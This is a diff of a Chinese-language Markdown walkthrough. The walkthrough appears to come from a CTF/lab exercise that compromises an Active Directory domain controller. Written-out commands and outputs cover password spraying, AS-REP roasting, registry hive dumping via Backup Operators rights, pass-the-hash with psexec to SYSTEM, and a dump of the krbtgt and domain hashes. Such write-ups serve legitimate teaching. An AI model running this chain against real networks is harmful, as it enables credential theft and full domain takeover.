-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">-sV</font>`<font style="color:rgb(51, 51, 51);"> 探测服务版本。</font>
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">-T4</font>`<font style="color:rgb(51, 51, 51);"> 提高扫描速度。</font>
++ `-Pn` 表示不做主机发现，直接认为目标在线，避免 ICMP 被过滤导致误判。
++ `-sC` 调用常用 NSE 脚本，补充基础服务信息。
++ `-sV` 探测服务版本。
++ `-T4` 提高扫描速度。
 
-<font style="color:rgb(51, 51, 51);">关键结果如下：</font>
+关键结果如下：
 
 ```plain
 53/tcp   open  domain        Simple DNS Plus
@@ -2369,33 +2370,33 @@ Domain: XMCVE.local
 Host: CASTLEVANIA.XMCVE.local
 ```
 
-<font style="color:rgb(51, 51, 51);">看到这个结果时，基本可以直接下结论：</font>
+看到这个结果时，基本可以直接下结论：
 
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">88</font>`<font style="color:rgb(51, 51, 51);">、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">389</font>`<font style="color:rgb(51, 51, 51);">、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">445</font>`<font style="color:rgb(51, 51, 51);"> 说明这是 AD 环境。</font>
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">389</font>`<font style="color:rgb(51, 51, 51);"> 的返回里已经给出了域名 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">XMCVE.local</font>`<font style="color:rgb(51, 51, 51);">。</font>
-+ <font style="color:rgb(51, 51, 51);">主机名是 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">CASTLEVANIA.XMCVE.local</font>`<font style="color:rgb(51, 51, 51);">。</font>
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">1433</font>`<font style="color:rgb(51, 51, 51);"> 说明这台机子还跑了 SQL Server。</font>
++ `88`、`389`、`445` 说明这是 AD 环境。
++ `389` 的返回里已经给出了域名 `XMCVE.local`。
++ 主机名是 `CASTLEVANIA.XMCVE.local`。
++ `1433` 说明这台机子还跑了 SQL Server。
 
-<font style="color:rgb(51, 51, 51);">这一步非常重要，因为后面所有账号格式、认证方式、攻击顺序都要围绕“域控”来设计。也正因为它是域控，所以一旦打穿，收益会非常高。</font>
+这一步非常重要，因为后面所有账号格式、认证方式、攻击顺序都要围绕“域控”来设计。也正因为它是域控，所以一旦打穿，收益会非常高。
 
-## <font style="color:rgb(51, 51, 51);">第二步：小规模弱口令喷洒，拿到第一个可用域账户</font>
-<font style="color:rgb(51, 51, 51);">既然这是域环境，直接盲扫 Web 没有明显入口时，最自然的思路就是先找一个最低成本的可用身份。这里没有上大字典，而是只做了小规模、高命中率的喷洒，避免无意义浪费时间。</font>
+## 第二步：小规模弱口令喷洒，拿到第一个可用域账户
+既然这是域环境，直接盲扫 Web 没有明显入口时，最自然的思路就是先找一个最低成本的可用身份。这里没有上大字典，而是只做了小规模、高命中率的喷洒，避免无意义浪费时间。
 
-<font style="color:rgb(51, 51, 51);">先用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">GetNPUsers.py</font>`<font style="color:rgb(51, 51, 51);"> 对一小批可能存在的用户做探测：</font>
+先用 `GetNPUsers.py` 对一小批可能存在的用户做探测：
 
-<font style="color:rgb(4, 30, 42);background-color:rgb(233, 242, 249);">GetNPUsers.py XMCVE.local/ -dc-ip 192.168.56.155 -no-pass -usersfile /tmp/babydc_users.txt</font>
+GetNPUsers.py XMCVE.local/ -dc-ip 192.168.56.155 -no-pass -usersfile /tmp/babydc_users.txt
 
-<font style="color:rgb(51, 51, 51);">这条命令的作用不是爆密码，而是利用 Kerberos 的错误回显区分“用户存在”和“用户不存在”。</font>
+这条命令的作用不是爆密码，而是利用 Kerberos 的错误回显区分“用户存在”和“用户不存在”。
 
-<font style="color:rgb(51, 51, 51);">从结果里可以确认如下用户是存在的：</font>
+从结果里可以确认如下用户是存在的：
 
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">admin</font>`
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">support</font>`
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc</font>`
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">castlevania</font>`
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">alucard</font>`
++ `admin`
++ `support`
++ `sqlsvc`
++ `castlevania`
++ `alucard`
 
-<font style="color:rgb(51, 51, 51);">有了有效用户名后，再用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">netexec</font>`<font style="color:rgb(51, 51, 51);"> 对 SMB 做一个非常小的弱口令喷洒：</font>
+有了有效用户名后，再用 `netexec` 对 SMB 做一个非常小的弱口令喷洒：
 
 ```plain
 netexec smb 192.168.56.155 \
@@ -2404,28 +2405,28 @@ netexec smb 192.168.56.155 \
   --continue-on-success
 ```
 
-<font style="color:rgb(51, 51, 51);">这里的思路很明确：</font>
+这里的思路很明确：
 
-+ <font style="color:rgb(51, 51, 51);">只打一小批最常见口令，如 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Password123!</font>`<font style="color:rgb(51, 51, 51);">、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">P@ssw0rd!</font>`<font style="color:rgb(51, 51, 51);"> 以及用户名同密码变体。</font>
-+ <font style="color:rgb(51, 51, 51);">用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">--continue-on-success</font>`<font style="color:rgb(51, 51, 51);"> 保证一个账户命中后继续跑完，看看是否存在统一弱口令。</font>
++ 只打一小批最常见口令，如 `Password123!`、`P@ssw0rd!` 以及用户名同密码变体。
++ 用 `--continue-on-success` 保证一个账户命中后继续跑完，看看是否存在统一弱口令。
 
-<font style="color:rgb(51, 51, 51);">关键命中结果如下：</font>
+关键命中结果如下：
 
 ```plain
 [+] XMCVE.local\admin:Password123!
 [+] XMCVE.local\support:Password123!
 ```
 
-<font style="color:rgb(51, 51, 51);">这一步说明题目确实存在统一弱口令设计，而且此时已经拥有了两个可用域用户。虽然它们还不是高权限，但已经足够进入 LDAP 查询阶段。</font>
+这一步说明题目确实存在统一弱口令设计，而且此时已经拥有了两个可用域用户。虽然它们还不是高权限，但已经足够进入 LDAP 查询阶段。
 
-## <font style="color:rgb(51, 51, 51);">第三步：查询 LDAP，锁定真正有利用价值的用户</font>
-<font style="color:rgb(51, 51, 51);">有了 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">admin:Password123!</font>`<font style="color:rgb(51, 51, 51);"> 之后，下一件事不是继续无脑喷更多口令，而是立刻转向 LDAP 收集高价值用户属性。</font>
+## 第三步：查询 LDAP，锁定真正有利用价值的用户
+有了 `admin:Password123!` 之后，下一件事不是继续无脑喷更多口令，而是立刻转向 LDAP 收集高价值用户属性。
 
-<font style="color:rgb(51, 51, 51);">这里使用：</font>
+这里使用：
 
-<font style="color:rgb(4, 30, 42);background-color:rgb(233, 242, 249);">netexec ldap 192.168.56.155 -u admin -p 'Password123!' --users</font>
+netexec ldap 192.168.56.155 -u admin -p 'Password123!' --users
 
-<font style="color:rgb(51, 51, 51);">这个命令会把域中的用户枚举出来，并附带一些基础属性，比如最近修改密码时间、描述等。关键输出如下：</font>
+这个命令会把域中的用户枚举出来，并附带一些基础属性，比如最近修改密码时间、描述等。关键输出如下：
 
 ```plain
 Administrator
@@ -2440,7 +2441,7 @@ admin
 sqlsvc    SQL Server Service Account
 ```
 
-<font style="color:rgb(51, 51, 51);">接着进一步查询 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">mowen</font>`<font style="color:rgb(51, 51, 51);"> 的属性：</font>
+接着进一步查询 `mowen` 的属性：
 
 ```plain
 ldapsearch -x -H ldap://192.168.56.155 \
@@ -2450,29 +2451,29 @@ ldapsearch -x -H ldap://192.168.56.155 \
   pwdLastSet description memberOf userAccountControl
 ```
 
-<font style="color:rgb(51, 51, 51);">关键结果是：</font>
+关键结果是：
 
 ```plain
 memberOf: CN=Backup Operators,CN=Builtin,DC=XMCVE,DC=local
 userAccountControl: 4260352
 ```
 
-<font style="color:rgb(51, 51, 51);">这里的 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">4260352</font>`<font style="color:rgb(51, 51, 51);"> 非常关键。把它转成十六进制是：</font>
+这里的 `4260352` 非常关键。把它转成十六进制是：
 
-<font style="color:rgb(4, 30, 42);background-color:rgb(233, 242, 249);">0x410200</font>
+0x410200
 
-<font style="color:rgb(51, 51, 51);">它包含了以下位：</font>
+它包含了以下位：
 
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">NORMAL_ACCOUNT</font>`
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">DONT_EXPIRE_PASSWORD</font>`
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">DONT_REQ_PREAUTH</font>`
++ `NORMAL_ACCOUNT`
++ `DONT_EXPIRE_PASSWORD`
++ `DONT_REQ_PREAUTH`
 
-<font style="color:rgb(51, 51, 51);">其中真正决定利用方向的是 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">DONT_REQ_PREAUTH</font>`<font style="color:rgb(51, 51, 51);">。这意味着 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">mowen</font>`<font style="color:rgb(51, 51, 51);"> 不需要 Kerberos 预认证，可以直接做 AS-REP Roast。与此同时，它还属于 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Backup Operators</font>`<font style="color:rgb(51, 51, 51);">，说明即使这个账户不是管理员，也非常可能具备系统级备份相关能力。这两个条件叠加，使得 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">mowen</font>`<font style="color:rgb(51, 51, 51);"> 立刻成为整题最关键的突破口。</font>
+其中真正决定利用方向的是 `DONT_REQ_PREAUTH`。这意味着 `mowen` 不需要 Kerberos 预认证，可以直接做 AS-REP Roast。与此同时，它还属于 `Backup Operators`，说明即使这个账户不是管理员，也非常可能具备系统级备份相关能力。这两个条件叠加，使得 `mowen` 立刻成为整题最关键的突破口。
 
-## <font style="color:rgb(51, 51, 51);">第四步：对 mowen 做 AS-REP Roast，离线爆出真实口令</font>
-<font style="color:rgb(51, 51, 51);">确定 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">mowen</font>`<font style="color:rgb(51, 51, 51);"> 开启了 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">DONT_REQ_PREAUTH</font>`<font style="color:rgb(51, 51, 51);"> 后，下一步就是直接请求它的 AS-REP 响应并离线爆破。</font>
+## 第四步：对 mowen 做 AS-REP Roast，离线爆出真实口令
+确定 `mowen` 开启了 `DONT_REQ_PREAUTH` 后，下一步就是直接请求它的 AS-REP 响应并离线爆破。
 
-<font style="color:rgb(51, 51, 51);">先生成哈希：</font>
+先生成哈希：
 
 ```plain
 echo mowen >/tmp/mowen_only.txt
@@ -2485,35 +2486,35 @@ GetNPUsers.py XMCVE.local/ \
   -usersfile /tmp/mowen_only.txt
 ```
 
-<font style="color:rgb(51, 51, 51);">生成出的哈希大致如下：</font>
+生成出的哈希大致如下：
 
-<font style="color:rgb(4, 30, 42);background-color:rgb(233, 242, 249);">$krb5asrep$23$mowen@XMCVE.LOCAL:2ebf4c95b4b4915427a335c63359292f$...</font>
+$krb5asrep$23$mowen@XMCVE.LOCAL:2ebf4c95b4b4915427a335c63359292f$...
 
-<font style="color:rgb(51, 51, 51);">然后使用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">hashcat</font>`<font style="color:rgb(51, 51, 51);"> 离线爆破：</font>
+然后使用 `hashcat` 离线爆破：
 
 ```plain
 hashcat -m 18200 /tmp/mowen_asrep.hash /usr/share/wordlists/rockyou.txt --force
 hashcat -m 18200 /tmp/mowen_asrep.hash --show --force
 ```
 
-<font style="color:rgb(51, 51, 51);">这里 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">-m 18200</font>`<font style="color:rgb(51, 51, 51);"> 对应的就是 Kerberos 5 AS-REP 哈希模式。</font>
+这里 `-m 18200` 对应的就是 Kerberos 5 AS-REP 哈希模式。
 
-<font style="color:rgb(51, 51, 51);">最终爆破结果：</font>
+最终爆破结果：
 
-<font style="color:rgb(4, 30, 42);background-color:rgb(233, 242, 249);">mowen:1maxwell</font>
+mowen:1maxwell
 
-<font style="color:rgb(51, 51, 51);">也就是说，我们拿到了第二个更高价值的域用户：</font>
+也就是说，我们拿到了第二个更高价值的域用户：
 
-<font style="color:rgb(4, 30, 42);background-color:rgb(233, 242, 249);">XMCVE\mowen : 1maxwell</font>
+XMCVE\mowen : 1maxwell
 
-<font style="color:rgb(51, 51, 51);">这一跳是整道题最核心的转折点。前面的 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">admin/support</font>`<font style="color:rgb(51, 51, 51);"> 只是拿来查询 LDAP 的低权账号，真正能把题做通的是 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">mowen</font>`<font style="color:rgb(51, 51, 51);">。</font>
+这一跳是整道题最核心的转折点。前面的 `admin/support` 只是拿来查询 LDAP 的低权账号，真正能把题做通的是 `mowen`。
 
-## <font style="color:rgb(51, 51, 51);">第五步：验证 mowen 的权限，确认 Backup Operators 利用可行</font>
-<font style="color:rgb(51, 51, 51);">拿到 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">mowen:1maxwell</font>`<font style="color:rgb(51, 51, 51);"> 后，第一件事就是判断它到底有多大权限。这里使用：</font>
+## 第五步：验证 mowen 的权限，确认 Backup Operators 利用可行
+拿到 `mowen:1maxwell` 后，第一件事就是判断它到底有多大权限。这里使用：
 
-<font style="color:rgb(4, 30, 42);background-color:rgb(233, 242, 249);">netexec smb 192.168.56.155 -u mowen -p '1maxwell' --shares</font>
+netexec smb 192.168.56.155 -u mowen -p '1maxwell' --shares
 
-<font style="color:rgb(51, 51, 51);">返回结果如下：</font>
+返回结果如下：
 
 ```plain
 ADMIN$          READ
@@ -2523,32 +2524,32 @@ NETLOGON        READ
 SYSVOL          READ
 ```
 
-<font style="color:rgb(51, 51, 51);">这个结果说明两件事：</font>
+这个结果说明两件事：
 
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">mowen</font>`<font style="color:rgb(51, 51, 51);"> 确实拥有非常强的文件级能力。</font>
-+ <font style="color:rgb(51, 51, 51);">它对 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">C$</font>`<font style="color:rgb(51, 51, 51);"> 具备读写权限，这和 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Backup Operators</font>`<font style="color:rgb(51, 51, 51);"> 的身份完全吻合。</font>
++ `mowen` 确实拥有非常强的文件级能力。
++ 它对 `C$` 具备读写权限，这和 `Backup Operators` 的身份完全吻合。
 
-<font style="color:rgb(51, 51, 51);">但此时还不能直接等价于“远程命令执行”。随后测试了 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">wmiexec.py</font>`<font style="color:rgb(51, 51, 51);">、</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">atexec.py</font>`<font style="color:rgb(51, 51, 51);"> 等方式，结果都返回 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">rpc_s_access_denied</font>`<font style="color:rgb(51, 51, 51);">，说明它并不具备完整的远程执行 ACL。因此正确的思路不是强行打 WMI/计划任务，而是回到 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Backup Operators</font>`<font style="color:rgb(51, 51, 51);"> 的本质能力：远程备份系统数据。</font>
+但此时还不能直接等价于“远程命令执行”。随后测试了 `wmiexec.py`、`atexec.py` 等方式，结果都返回 `rpc_s_access_denied`，说明它并不具备完整的远程执行 ACL。因此正确的思路不是强行打 WMI/计划任务，而是回到 `Backup Operators` 的本质能力：远程备份系统数据。
 
-## <font style="color:rgb(51, 51, 51);">第六步：利用 Backup Operators 远程备份注册表 hive</font>
-<font style="color:rgb(51, 51, 51);">既然 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">mowen</font>`<font style="color:rgb(51, 51, 51);"> 属于 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Backup Operators</font>`<font style="color:rgb(51, 51, 51);">，最稳的利用方式就是使用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">reg.py</font>`<font style="color:rgb(51, 51, 51);"> 远程备份系统注册表 hive。前面先确认一下远程注册表能否访问：</font>
+## 第六步：利用 Backup Operators 远程备份注册表 hive
+既然 `mowen` 属于 `Backup Operators`，最稳的利用方式就是使用 `reg.py` 远程备份系统注册表 hive。前面先确认一下远程注册表能否访问：
 
-<font style="color:rgb(4, 30, 42);background-color:rgb(233, 242, 249);">reg.py XMCVE.local/mowen:'1maxwell'@192.168.56.155 query -keyName 'HKLM\\SAM'</font>
+reg.py XMCVE.local/mowen:'1maxwell'@192.168.56.155 query -keyName 'HKLM\\SAM'
 
-<font style="color:rgb(51, 51, 51);">返回：</font>
+返回：
 
 ```plain
 HKLM\SAM
 HKLM\SAM\SAM
 ```
 
-<font style="color:rgb(51, 51, 51);">这说明远程注册表访问是通的，后续可以尝试保存。</font>
+这说明远程注册表访问是通的，后续可以尝试保存。
 
-<font style="color:rgb(51, 51, 51);">接下来直接使用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">backup</font>`<font style="color:rgb(51, 51, 51);"> 动作一次性保存三份关键 hive：</font>
+接下来直接使用 `backup` 动作一次性保存三份关键 hive：
 
-<font style="color:rgb(4, 30, 42);background-color:rgb(233, 242, 249);">reg.py XMCVE.local/mowen:'1maxwell'@192.168.56.155 backup -o 'C:\Windows\Temp'</font>
+reg.py XMCVE.local/mowen:'1maxwell'@192.168.56.155 backup -o 'C:\Windows\Temp'
 
-<font style="color:rgb(51, 51, 51);">关键结果如下：</font>
+关键结果如下：
 
 ```plain
 [*] Saved HKLM\SAM to C:\Windows\Temp\SAM.save
@@ -2556,16 +2557,16 @@ HKLM\SAM\SAM
 [*] Saved HKLM\SECURITY to C:\Windows\Temp\SECURITY.save
 ```
 
-<font style="color:rgb(51, 51, 51);">这一步的本质是：</font>
+这一步的本质是：
 
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SAM</font>`<font style="color:rgb(51, 51, 51);"> 保存本地账号哈希</font>
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SYSTEM</font>`<font style="color:rgb(51, 51, 51);"> 里有 bootKey，用于解密 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SAM/SECURITY</font>`
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SECURITY</font>`<font style="color:rgb(51, 51, 51);"> 里有 LSA Secrets、服务密码、缓存凭据等高价值秘密</font>
++ `SAM` 保存本地账号哈希
++ `SYSTEM` 里有 bootKey，用于解密 `SAM/SECURITY`
++ `SECURITY` 里有 LSA Secrets、服务密码、缓存凭据等高价值秘密
 
-<font style="color:rgb(51, 51, 51);">很多人做到这里会卡住，因为他们试图直接走远程执行。但本题真正的提权关键不是远程执行，而是“先把秘密导出来，再离线提取”。</font>
+很多人做到这里会卡住，因为他们试图直接走远程执行。但本题真正的提权关键不是远程执行，而是“先把秘密导出来，再离线提取”。
 
-## <font style="color:rgb(51, 51, 51);">第七步：拉回本地并离线提取秘密</font>
-<font style="color:rgb(51, 51, 51);">先把远程保存好的三个文件拉回本地：</font>
+## 第七步：拉回本地并离线提取秘密
+先把远程保存好的三个文件拉回本地：
 
 ```plain
 netexec smb 192.168.56.155 -u mowen -p '1maxwell' --get-file 'Windows\Temp\SAM.save' /tmp/SAM.save
@@ -2573,11 +2574,11 @@ netexec smb 192.168.56.155 -u mowen -p '1maxwell' --get-file 'Windows\Temp\SYSTE
 netexec smb 192.168.56.155 -u mowen -p '1maxwell' --get-file 'Windows\Temp\SECURITY.save' /tmp/SECURITY.save
 ```
 
-<font style="color:rgb(51, 51, 51);">然后使用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">secretsdump.py</font>`<font style="color:rgb(51, 51, 51);"> 进行本地离线提取：</font>
+然后使用 `secretsdump.py` 进行本地离线提取：
 
-<font style="color:rgb(4, 30, 42);background-color:rgb(233, 242, 249);">secretsdump.py -sam /tmp/SAM.save -system /tmp/SYSTEM.save -security /tmp/SECURITY.save LOCAL</font>
+secretsdump.py -sam /tmp/SAM.save -system /tmp/SYSTEM.save -security /tmp/SECURITY.save LOCAL
 
-<font style="color:rgb(51, 51, 51);">这里的关键输出非常重要：</font>
+这里的关键输出非常重要：
 
 ```plain
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:d94f9831271e229dbc6e712097b63168:::
@@ -2586,19 +2587,19 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:d94f9831271e229dbc6e712097b63
 (Unknown User):Sql!2026
 ```
 
-<font style="color:rgb(51, 51, 51);">这个结果意味着我们一次性拿到了两个关键资产：</font>
+这个结果意味着我们一次性拿到了两个关键资产：
 
-1. `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`<font style="color:rgb(51, 51, 51);"> 的 NTLM 哈希</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">d94f9831271e229dbc6e712097b63168</font>`
-2. <font style="color:rgb(51, 51, 51);">SQL Server 服务密码</font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">_SC_MSSQLSERVER = Sql!2026</font>`
+1. `Administrator` 的 NTLM 哈希`d94f9831271e229dbc6e712097b63168`
+2. SQL Server 服务密码`_SC_MSSQLSERVER = Sql!2026`
 
-<font style="color:rgb(51, 51, 51);">先说第二个。服务密码后来验证对应的是域用户 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">sqlsvc</font>`<font style="color:rgb(51, 51, 51);">，说明 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SECURITY</font>`<font style="color:rgb(51, 51, 51);"> hive 里确实成功导出了服务机密：</font>
+先说第二个。服务密码后来验证对应的是域用户 `sqlsvc`，说明 `SECURITY` hive 里确实成功导出了服务机密：
 
-<font style="color:rgb(4, 30, 42);background-color:rgb(233, 242, 249);">XMCVE\sqlsvc : Sql!2026</font>
+XMCVE\sqlsvc : Sql!2026
 
-<font style="color:rgb(51, 51, 51);">但这条线虽然能登录 SMB，却没有直接带来远程执行，所以真正决定通关的仍然是第一个东西，也就是 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`<font style="color:rgb(51, 51, 51);"> 的 NTLM 哈希。</font>
+但这条线虽然能登录 SMB，却没有直接带来远程执行，所以真正决定通关的仍然是第一个东西，也就是 `Administrator` 的 NTLM 哈希。
 
-## <font style="color:rgb(51, 51, 51);">第八步：使用 Administrator 哈希直接 Pass-the-Hash，拿到 SYSTEM</font>
-<font style="color:rgb(51, 51, 51);">拿到 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">Administrator</font>`<font style="color:rgb(51, 51, 51);"> 的 NTLM 哈希后，最直接的做法就是 PTH。这里使用 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">psexec.py</font>`<font style="color:rgb(51, 51, 51);">：</font>
+## 第八步：使用 Administrator 哈希直接 Pass-the-Hash，拿到 SYSTEM
+拿到 `Administrator` 的 NTLM 哈希后，最直接的做法就是 PTH。这里使用 `psexec.py`：
 
 ```plain
 psexec.py \
@@ -2607,13 +2608,13 @@ psexec.py \
   'whoami'
 ```
 
-<font style="color:rgb(51, 51, 51);">这条命令里有几个点需要说明：</font>
+这条命令里有几个点需要说明：
 
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">LM hash</font>`<font style="color:rgb(51, 51, 51);"> 这里用的是空 LM 的固定占位值 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">aad3b435b51404eeaad3b435b51404ee</font>`
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">NT hash</font>`<font style="color:rgb(51, 51, 51);"> 就是刚刚从 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SAM</font>`<font style="color:rgb(51, 51, 51);"> 中提取出来的管理员哈希</font>
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">./Administrator@192.168.56.155</font>`<font style="color:rgb(51, 51, 51);"> 表示使用本地上下文账号发起认证</font>
++ `LM hash` 这里用的是空 LM 的固定占位值 `aad3b435b51404eeaad3b435b51404ee`
++ `NT hash` 就是刚刚从 `SAM` 中提取出来的管理员哈希
++ `./Administrator@192.168.56.155` 表示使用本地上下文账号发起认证
 
-<font style="color:rgb(51, 51, 51);">关键返回如下：</font>
+关键返回如下：
 
 ```plain
 [*] Found writable share ADMIN$
@@ -2623,17 +2624,17 @@ psexec.py \
 nt authority\system
 ```
 
-<font style="color:rgb(51, 51, 51);">为什么这说明已经拿下最高权限？</font>
+为什么这说明已经拿下最高权限？
 
-<font style="color:rgb(51, 51, 51);">因为 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">psexec.py</font>`<font style="color:rgb(51, 51, 51);"> 的原理是：</font>
+因为 `psexec.py` 的原理是：
 
-+ <font style="color:rgb(51, 51, 51);">先通过 SMB 把一个服务可执行文件上传到目标机</font>
-+ <font style="color:rgb(51, 51, 51);">再通过服务控制管理器创建并启动临时服务</font>
-+ <font style="color:rgb(51, 51, 51);">服务默认以 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">LocalSystem</font>`<font style="color:rgb(51, 51, 51);"> 运行</font>
++ 先通过 SMB 把一个服务可执行文件上传到目标机
++ 再通过服务控制管理器创建并启动临时服务
++ 服务默认以 `LocalSystem` 运行
 
-<font style="color:rgb(51, 51, 51);">也就是说，只要这一套链条完整走通，并且最后执行结果回显 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">nt authority\system</font>`<font style="color:rgb(51, 51, 51);">，就已经不是普通管理员权限，而是标准的 Windows 最高本地权限。</font>
+也就是说，只要这一套链条完整走通，并且最后执行结果回显 `nt authority\system`，就已经不是普通管理员权限，而是标准的 Windows 最高本地权限。
 
-<font style="color:rgb(51, 51, 51);">为了把证据补完整，还进一步执行了：</font>
+为了把证据补完整，还进一步执行了：
 
 ```plain
 psexec.py \
@@ -2642,7 +2643,7 @@ psexec.py \
   'whoami /all'
 ```
 
-<font style="color:rgb(51, 51, 51);">返回结果里明确出现：</font>
+返回结果里明确出现：
 
 ```plain
 User Name
@@ -2653,12 +2654,12 @@ SeImpersonatePrivilege           Enabled
 SeTcbPrivilege                   Enabled
 ```
 
-<font style="color:rgb(51, 51, 51);">到这里就可以非常明确地确认，本题的最高权限已经拿到。</font>
+到这里就可以非常明确地确认，本题的最高权限已经拿到。
 
-## <font style="color:rgb(51, 51, 51);">第九步：在已拿到高权限后继续导出整套域凭据</font>
-<font style="color:rgb(51, 51, 51);">虽然题目到拿下 </font>`<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">SYSTEM</font>`<font style="color:rgb(51, 51, 51);"> 就已经结束了，但因为目标本身是一台 DC，所以在已有管理员哈希的情况下，还可以顺手把整套域凭据导出来，进一步证明整台域控已经完全接管。</font>
+## 第九步：在已拿到高权限后继续导出整套域凭据
+虽然题目到拿下 `SYSTEM` 就已经结束了，但因为目标本身是一台 DC，所以在已有管理员哈希的情况下，还可以顺手把整套域凭据导出来，进一步证明整台域控已经完全接管。
 
-<font style="color:rgb(51, 51, 51);">这里直接使用：</font>
+这里直接使用：
 
 ```plain
 secretsdump.py \
@@ -2666,7 +2667,7 @@ secretsdump.py \
   ./Administrator@192.168.56.155
 ```
 
-<font style="color:rgb(51, 51, 51);">关键输出如下：</font>
+关键输出如下：
 
 ```plain
 krbtgt:502:...:1e3c4fe72e1383c576b4b3aeef4730a8:::
@@ -2676,24 +2677,24 @@ XMCVE.local\admin:1110:...:2b576acbe6bcfda7294d6bd18041b8fe:::
 XMCVE.local\sqlsvc:1112:...:d93ef04edb808c5bce3a5bd67b936ca9:::
 ```
 
-<font style="color:rgb(51, 51, 51);">这里最重要的意义在于：</font>
+这里最重要的意义在于：
 
-+ `<font style="color:rgb(51, 51, 51);background-color:rgb(243, 244, 244);">krbtgt</font>`<font style="color:rgb(51, 51, 51);"> 哈希已经被导出，说明整个域的核心机密已经暴露。</font>
-+ <font style="color:rgb(51, 51, 51);">题目里的所有域用户哈希也全部拿到了。</font>
-+ <font style="color:rgb(51, 51, 51);">从“拿到一台主机的 SYSTEM”进一步升级成了“完全接管整套域”。</font>
++ `krbtgt` 哈希已经被导出，说明整个域的核心机密已经暴露。
++ 题目里的所有域用户哈希也全部拿到了。
++ 从“拿到一台主机的 SYSTEM”进一步升级成了“完全接管整套域”。
 
